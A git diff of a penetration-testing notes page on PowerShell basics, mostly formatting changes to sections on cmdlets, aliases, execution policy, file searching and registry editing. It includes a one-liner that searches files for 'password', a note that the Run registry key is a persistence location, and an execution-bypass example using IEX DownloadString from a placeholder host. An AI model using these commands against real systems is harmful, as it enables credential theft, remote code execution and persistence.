@@ -6,19 +6,19 @@ For PowerShell syntax examples see my scripting page [here](../os-agnostic/scrip
 
 ## PowerShell Commands
 
-In PowerShell, there are three main types of commands: cmdlets, functions, and aliases.  
+In PowerShell, there are three main types of commands: cmdlets, functions, and aliases.
 
 ### Cmdlets
 
-Cmdlet is pronounced "command-let". They are instances of .NET classes, not stand-alone executables like in other shell environments. This makes it extremely easy for third parties to extend the functionality of PowerShell without compiling new binaries.  Cmdlet names have the form "Verb-Noun" to make them easily discoverable \(according to Microsoft anyway!\).
+Cmdlet is pronounced "command-let". They are instances of .NET classes, not stand-alone executables like in other shell environments. This makes it extremely easy for third parties to extend the functionality of PowerShell without compiling new binaries. Cmdlet names have the form "Verb-Noun" to make them easily discoverable \(according to Microsoft anyway!\).
 
-Since cmdlets are an actual instance of a .NET class, the output from a command is a bit different than in a traditional command shell.  Instead of the common standard-in and standard-out, PowerShell returns an object that contains a number of properties of which a select number are displayed depending on the cmdlet.  Objects returned by a cmdlet often have many more discoverable properties and methods that can be manipulated and acted on by those with experience, through experimentation, or by reading the documentation.  This makes it extremely powerful.  
+Since cmdlets are an actual instance of a .NET class, the output from a command is a bit different than in a traditional command shell. Instead of the common standard-in and standard-out, PowerShell returns an object that contains a number of properties of which a select number are displayed depending on the cmdlet. Objects returned by a cmdlet often have many more discoverable properties and methods that can be manipulated and acted on by those with experience, through experimentation, or by reading the documentation. This makes it extremely powerful.
 
 You can also use them in pretty much the same way as commands in a traditional shell environment without knowing any of this, though you will get much more out of it if you take the time to learn.
 
 #### cmdlet verbs
 
-Cmdlets are restricted to only a set list of verbs.  Nouns can be whatever you want, but should follow Third party developers and scripters are encouraged by Microsoft to only use ones from this list for consistency, but PowerShell will not deny modules that use other verbs from running. The most common verbs are **New**, **Get**, **Set**, and **Invoke**, though there are many more. You can read more about this [here](https://docs.microsoft.com/en-us/powershell/scripting/developer/cmdlet/approved-verbs-for-windows-powershell-commands?view=powershell-7). 
+Cmdlets are restricted to only a set list of verbs. Nouns can be whatever you want, but should follow Third party developers and scripters are encouraged by Microsoft to only use ones from this list for consistency, but PowerShell will not deny modules that use other verbs from running. The most common verbs are **New**, **Get**, **Set**, and **Invoke**, though there are many more. You can read more about this [here](https://docs.microsoft.com/en-us/powershell/scripting/developer/cmdlet/approved-verbs-for-windows-powershell-commands?view=powershell-7).
 
 #### The Three Core Cmdlets
 
@@ -26,41 +26,11 @@ If you know how to use these three cmdlets, you can figure out how to use any ot
 
 Run `Get-Help $cmdlet_name -Examples` for usage
 
-<table>
-  <thead>
-    <tr>
-      <th style="text-align:left">Cmdlet</th>
-      <th style="text-align:left">Alias</th>
-      <th style="text-align:left">Description</th>
-    </tr>
-  </thead>
-  <tbody>
-    <tr>
-      <td style="text-align:left"><a href="https://www.pdq.com/powershell/get-command/">Get-Command</a>
-      </td>
-      <td style="text-align:left">gcm</td>
-      <td style="text-align:left">Gets all currently installed PowerShell commands.</td>
-    </tr>
-    <tr>
-      <td style="text-align:left"><a href="https://www.pdq.com/powershell/get-help/">Get-Help</a>
-      </td>
-      <td style="text-align:left"></td>
-      <td style="text-align:left">
-        <p></p>
-        <p>Displays basic help about cmdlets and functions, including examples. To
-          get more advanced examples and information, the help index may need updating
-          with <code>Update-Help</code> as it is not installed by default (may require
-          admin rights). Similar to Unix <code>man</code> pages.</p>
-      </td>
-    </tr>
-    <tr>
-      <td style="text-align:left"><a href="https://www.pdq.com/powershell/get-member/">Get-Member</a>
-      </td>
-      <td style="text-align:left">gm</td>
-      <td style="text-align:left">Gets the properties and methods of objects.</td>
-    </tr>
-  </tbody>
-</table>
+| Cmdlet | Alias | Description |
+| :--- | :--- | :--- |
+| [Get-Command](https://www.pdq.com/powershell/get-command/) | gcm | Gets all currently installed PowerShell commands. |
+| [Get-Help](https://www.pdq.com/powershell/get-help/) |  | Displays basic help about cmdlets and functions, including examples. To get more advanced examples and information, the help index may need updating with `Update-Help` as it is not installed by default \(may require admin rights\). Similar to Unix `man` pages. |
+| [Get-Member](https://www.pdq.com/powershell/get-member/) | gm | Gets the properties and methods of objects. |
 
 #### Other useful cmdlets
 
@@ -288,7 +258,8 @@ Run `Get-Help $cmdlet_name -Examples` for usage
 
 ### Functions
 
-TODO: (issue [#25](https://github.com/zweilosec/Infosec-Notes/issues/25))
+TODO: \(issue [\#25](https://github.com/zweilosec/Infosec-Notes/issues/25)\)
+
 * Break PowerShell Functions section up by Category
 * Add description of difference between cmdlets and functions
 * Add information about creating functions, anonymous functions
@@ -409,7 +380,7 @@ Run `Get-Help $function_name -Examples` for usage
 
 ### Aliases
 
-There are many built-in aliases for the most commonly used cmdlets.  The developers wanted to make cmd.exe and Unix users feel at home, so many of those basic commands will function in a similar way.  Here are some commonly used examples.  You can use the `Get-Alias` cmdlet to see the full list.
+There are many built-in aliases for the most commonly used cmdlets. The developers wanted to make cmd.exe and Unix users feel at home, so many of those basic commands will function in a similar way. Here are some commonly used examples. You can use the `Get-Alias` cmdlet to see the full list.
 
 <table>
   <thead>
@@ -472,7 +443,7 @@ $PSVersionTable
 
 ## Script Execution Policy
 
-TODO: add short description about what this is and why it's important (issue [#26](https://github.com/zweilosec/Infosec-Notes/issues/26))
+TODO: add short description about what this is and why it's important \(issue [\#26](https://github.com/zweilosec/Infosec-Notes/issues/26)\)
 
 | Policy | Description |
 | :--- | :--- |
@@ -480,10 +451,10 @@ TODO: add short description about what this is and why it's important (issue [#2
 | **Bypass** | Bypasses checks for whether files are signed, and internet origin is not verified. |
 | **Default** | The default policies are **Restricted** \(client systems\) or **RemoteSigned** \(Server 2016+\) |
 | **RemoteSigned** | All .ps1 files originating from the internet must be digitally signed. PowerShell prompts the user to determine if files from the signing publisher should be run. Allows local scripts and remote scripts if they are signed. |
-| **Restricted** | All .ps1 files are blocked.  |
+| **Restricted** | All .ps1 files are blocked. |
 | **Undefined** | There is no execution policy set in the current scope. Reverts to **Default** policy. |
 
-To view current execution policy check use the cmdlet `Get-ExecutionPolicy`.  If no execution policy is set in any scope, the effective execution policy is **Restricted,** which is the default for client systems \(Windows 10\) or **RemoteSigned** \(Server 2016+\). ****The policy can be changed with the cmdlet `Set-ExecutionPolicy <PolicyName>`. 
+To view current execution policy check use the cmdlet `Get-ExecutionPolicy`. If no execution policy is set in any scope, the effective execution policy is **Restricted,** which is the default for client systems \(Windows 10\) or **RemoteSigned** \(Server 2016+\). _\*\*_The policy can be changed with the cmdlet `Set-ExecutionPolicy <PolicyName>`.
 
 {% hint style="success" %}
 For**`Execution-Policy`** bypass methods for privilege escalation and so on see [this section](windows-redteam/privilege-escalation.md#script-execution-policy-bypass-methods).
@@ -548,7 +519,6 @@ The following example uses the **GetEnvironmentVariable** method to get the mach
 ```text
 $path = [Environment]::GetEnvironmentVariable('PSModulePath', 'Machine')
 $newpath = $path + ';C:\Program Files\Fabrikam\Modules'
-[Environment]::SetEnvironmentVariable("PSModulePath", $newpath, 'Machine')
 ```
 
 ## Working with Files
@@ -581,7 +551,7 @@ Normal
 
 ### Recursively search for files that contain a certain string
 
-[https://superuser.com/questions/815527/way-to-list-and-cat-all-files-that-contain-string-x-in-powershell](https://superuser.com/questions/815527/way-to-list-and-cat-all-files-that-contain-string-x-in-powershell) - look for text in a file and lists its name and contents.  These examples are looking for the word 'password'.
+[https://superuser.com/questions/815527/way-to-list-and-cat-all-files-that-contain-string-x-in-powershell](https://superuser.com/questions/815527/way-to-list-and-cat-all-files-that-contain-string-x-in-powershell) - look for text in a file and lists its name and contents. These examples are looking for the word 'password'.
 
 #### Shorthand \(aliased\) version:
 
@@ -589,13 +559,13 @@ Normal
 ls -R|?{$_|sls 'password'}|%{$_.FullName;gc $_}
 ```
 
-Remove `;gc $_` to only list the filenames. Then you can extract to Linux and use better text manipulation tools like `strings` and `grep`. 
+Remove `;gc $_` to only list the filenames. Then you can extract to Linux and use better text manipulation tools like `strings` and `grep`.
 
 ```text
 ls -R | ? { $_ | sls 'password' } | % { $_ ; gc $_ }
 ```
 
-The above is expanded for visibility of the individual elements.  The shorthand version is condensed for situations where characters are at a premium.
+The above is expanded for visibility of the individual elements. The shorthand version is condensed for situations where characters are at a premium.
 
 #### Full version:
 
@@ -634,7 +604,7 @@ Aside from the obvious use of aliases, collapsing of whitespace, and truncation 
 
 ## Modifying the Registry
 
-To add, edit, and modify registry keys.  Here, `HKCU:\Software\Microsoft\Windows\CurrentVersion\Run` is given as the path \(popular persistence location!\), but any path can be substituted.
+To add, edit, and modify registry keys. Here, `HKCU:\Software\Microsoft\Windows\CurrentVersion\Run` is given as the path \(popular persistence location!\), but any path can be substituted.
 
 ```text
 # add a new key to registry:
@@ -703,10 +673,11 @@ wget https://zweilosec.gitbook.io/hackers-rest -OutFile C:\Windows\Temp\out.html
 
 `wget` is an alias for `Invoke-WebRequest`. Adding `-Outfile $out_file` is needed to save the file to disk.
 
-### PowerShell Script Execution Bypass: 
+### PowerShell Script Execution Bypass:
 
-TODO: Expand and clean up PowerShell Bypass section.  Link to Windows Privilege Escalation page (issue [#27](https://github.com/zweilosec/Infosec-Notes/issues/27))
-* Take examples from https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/ and add
+TODO: Expand and clean up PowerShell Bypass section. Link to Windows Privilege Escalation page \(issue [\#27](https://github.com/zweilosec/Infosec-Notes/issues/27)\)
+
+* Take examples from [https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/) and add
 * Write script example of embedding the below PowerShell bypass in php script
 * Check the PowerShell example below and see if the trailing `-` means something is missing
 * Link or add this information to Windows Privilege Escalation page
@@ -717,13 +688,11 @@ Echo IEX(New-Object Net.WebClient).DownloadString(http://$ip:$port/$script_file)
 
 ### Silence PowerShell error messages
 
-Many PowerShell cmdlets support the **`-ErrorAction SilentlyContinue`** attribute, which works similarly to using **`2>/dev/null`** in Linux.  However, this only works for that cmdlet, not the entire one-liner if you pipe output or use semi-colons, etc.  This can be shortened to **`-EA Silently`**. 
+Many PowerShell cmdlets support the **`-ErrorAction SilentlyContinue`** attribute, which works similarly to using **`2>/dev/null`** in Linux. However, this only works for that cmdlet, not the entire one-liner if you pipe output or use semi-colons, etc. This can be shortened to **`-EA Silently`**.
 
 ### Unsorted...
 
 PowerShell reverse shell and exploit scripts: `nishang` To learn how to use this tool check out Ippsec's video on youtube: [Ippsec:HacktheBox - Optimum](https://www.youtube.com/watch?v=kWTnVBIpNsE) TODO: look up this tool and give examples and description
-
-
 
 ## Resources
 
@@ -732,7 +701,6 @@ PowerShell reverse shell and exploit scripts: `nishang` To learn how to use this
 * [https://docs.microsoft.com/en-us/powershell/scripting/learn/ps101/02-help-system?view=powershell-7](https://docs.microsoft.com/en-us/powershell/scripting/learn/ps101/02-help-system?view=powershell-7)
 * [https://www.pdq.com/powershell/](https://www.pdq.com/powershell/)
 * TODO:
-
   * [https://0xdarkvortex.dev/index.php/2019/01/01/active-directory-penetration-dojo-ad-environment-enumeration-1/](https://0xdarkvortex.dev/index.php/2019/01/01/active-directory-penetration-dojo-ad-environment-enumeration-1/) - site down?
   * [https://activedirectorypro.com/powershell-commands/](https://activedirectorypro.com/powershell-commands/) 
 
